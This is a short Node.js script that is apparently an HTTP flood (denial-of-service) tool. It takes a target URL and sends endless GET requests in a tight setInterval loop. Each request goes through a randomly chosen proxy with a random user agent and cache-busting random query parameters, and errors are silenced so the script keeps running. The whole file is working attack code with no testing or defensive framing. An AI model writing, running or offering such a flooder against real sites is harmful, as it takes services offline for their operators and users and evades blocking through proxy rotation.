import request from 'request'
import fs from "fs"
import cryptoRandomString from 'crypto-random-string'


let target = process.argv[2];
console.log(target)
let proxies = fs.readFileSync('lol2.txt', 'utf-8').replace(/\r/gi, '').split('\n');
let useragents = fs.readFileSync('lol3.txt', 'utf-8').replace(/\r/gi, '').split('\n');

function send_request(){
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    let useragent = useragents[Math.floor(Math.random() * useragents.length)];
    request.get({
        url: target + '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}),
        proxy: "http://" + proxy,
        headers: {
            'User-Agent': useragent
        }
    });
}


setInterval(() => {
    send_request();
});

console.log(".")
console.log(".")
console.log(".")
console.log(".")
console.log(".")
console.log(".")
console.log(".")
console.log(".")
console.log(".")
console.log(".")
console.log(".")

process.on('uncaughtException', function (err) {
   
});
process.on('unhandledRejection', function (err) {
   
});